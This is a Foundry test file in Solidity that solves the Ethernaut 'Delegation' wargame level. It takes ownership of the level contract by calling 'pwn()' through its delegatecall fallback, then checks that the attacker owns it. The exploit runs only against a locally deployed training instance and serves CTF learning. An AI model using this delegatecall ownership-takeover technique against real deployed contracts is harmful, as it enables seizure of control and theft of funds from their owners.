// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/06-Delegation/DelegationFactory.sol";
import "../../../src/core/Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DelegationFactory delegateFactory = new DelegationFactory();
        ethernaut.registerLevel(delegateFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(delegateFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // delegate the call to the Delegate contract. The code will execute inside the
        // Delegate contract, but the storage updates of the Delegation contract.
        (
            bool success, /*bytes memory data*/

        ) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "delegation call failed.");

        assertEq(ethernautDelegation.owner(), attacker);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
